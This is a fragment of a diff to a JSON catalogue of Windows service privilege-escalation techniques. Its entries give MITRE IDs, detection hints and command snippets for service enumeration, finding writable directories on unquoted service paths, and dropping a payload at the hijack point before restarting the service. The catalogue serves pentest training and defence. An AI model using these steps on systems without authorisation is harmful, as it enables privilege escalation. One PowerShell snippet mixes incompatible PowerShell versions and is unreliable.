+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE ATT&CK - Create or Modify System Process: Windows Service",
+          "url": "https://attack.mitre.org/techniques/T1543/003/",
+          "kind": "mitre"
+        },
+        {
+          "title": "HackTricks - Create Service",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#create-a-service",
+          "kind": "hacktricks"
+        }
+      ]
+    },
+    {
+      "id": "svc-wmic-psservice",
+      "kind": "technique",
+      "title": "Service Enumeration and Abuse via WMIC and PsService",
+      "summary": "Use WMIC and Sysinternals PsService for deeper service enumeration including service accounts, start modes, and configuration not visible via sc query.",
+      "severity": "info",
+      "parent_id": "svc-enum",
+      "description_md": "WMIC and PsService expose additional service attributes useful for privilege escalation enumeration:\n- WMIC: StartName (service account), ProcessId, State, PathName\n- PsService: full configuration, dependency trees, SCM-level ACLs\n\nThis complements `accesschk` discovery and helps identify services running as domain accounts or with auto-start set to interesting values.",
+      "difficulty": "oscp-basic",
+      "mitre_attack_id": "T1007",
+      "detection_hints": "Monitor wmic.exe and PsService.exe execution from non-admin sessions. WMIC service queries are often seen in enumeration scripts (PowerUp, winPEAS).",
+      "tags": [
+        "enumeration",
+        "wmic",
+        "psservice",
+        "service"
+      ],
+      "prerequisites": [
+        "svc-enum"
+      ],
+      "related": [
+        "svc-accesschk-discovery"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "WMIC service enumeration",
+          "code": "wmic service get name,startname,pathname,startmode,state /format:list\nwmic service where \"startname != 'LocalSystem'\" get name,startname,pathname",
+          "description": "List all services with their account context and binary path; highlight non-SYSTEM accounts.",
+          "requires_admin": false
+        },
+        {
+          "shell": "cmd",
+          "title": "PsService full config dump",
+          "code": "PsService.exe config VulnSvc\nPsService.exe security VulnSvc",
+          "description": "Dump full service configuration and security descriptor using PsService.",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "Sysinternals PsService",
+          "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/psservice",
+          "kind": "tool"
+        },
+        {
+          "title": "HackTricks - Windows Service Enumeration",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services",
+          "kind": "hacktricks"
+        }
+      ]
+    },
+    {
+      "id": "svc-path-spaces-variant",
+      "kind": "technique",
+      "title": "Service Path Spaces Beyond Unquoted Path (Directory Hijack)",
+      "summary": "Place a malicious executable at an intermediate path segment exploited by the Windows service path resolution algorithm when service paths contain spaces and no quotes.",
+      "severity": "high",
+      "parent_id": "svc-enum",
+      "description_md": "Extends the classic unquoted service path (svc-unquoted-path): focus on writable intermediate directories. Windows tries `C:\\Program.exe`, `C:\\Program Files\\Vendor.exe`, then `C:\\Program Files\\Vendor App\\Service.exe`. An attacker needs write access to any directory in this chain, not just the final directory.\n\nKey difference from `svc-unquoted-path`: the evaluation here is on finding writable intermediate parent directories that the classic tool check may miss, especially under non-standard installation trees.",
+      "difficulty": "oscp-basic",
+      "mitre_attack_id": "T1574.009",
+      "detection_hints": "Alert on creation of .exe files at path roots or intermediate directories that do not match known software. Monitor Event ID 4688 for process creation from unexpected locations.",
+      "tags": [
+        "service",
+        "unquoted-path",
+        "directory-hijack",
+        "spaces"
+      ],
+      "prerequisites": [
+        "svc-unquoted-path",
+        "svc-enum"
+      ],
+      "related": [
+        "svc-writable-binary-system"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Find unquoted paths with writable intermediate dirs",
+          "code": "Get-WmiObject Win32_Service | Where-Object { $_.PathName -match ' ' -and $_.PathName -notmatch '\"' } | ForEach-Object {\n    $parts = $_.PathName -split ' '\n    $cumulative = ''\n    for ($i = 0; $i -lt $parts.Count - 1; $i++) {\n        $cumulative += ($i -eq 0 ? $parts[$i] : ' ' + $parts[$i])\n        $testPath = $cumulative + '.exe'\n        $parentDir = Split-Path $cumulative\n        $acl = Get-Acl $parentDir -ErrorAction SilentlyContinue\n        $acl.Access | Where-Object {\n            $_.FileSystemRights -match 'Write|FullControl' -and\n            $_.IdentityReference -notmatch 'SYSTEM|Administrators|TrustedInstaller'\n        } | ForEach-Object {\n            Write-Output \"Writable dir: $parentDir -> Place: $testPath\"\n        }\n    }\n}",
+          "description": "Identify services with unquoted paths and enumerate write access to every intermediate directory.",
+          "requires_admin": false
+        },
+        {
+          "shell": "cmd",
+          "title": "Place payload at hijack point",
+          "code": "copy C:\\Temp\\payload.exe \"C:\\Program Files\\Vendor.exe\"\nnet stop VulnSvc && net start VulnSvc",
+          "description": "Drop payload at the hijack location and restart the service.",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE ATT&CK - Path Interception by Unquoted Path",
+          "url": "https://attack.mitre.org/techniques/T1574/009/",
+          "kind": "mitre"
+        },
+        {
+          "title": "HackTricks - Unquoted Service Paths",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#unquoted-service-paths",
+          "kind": "hacktricks"
+        }
+      ]
+    }
+  ]
+}
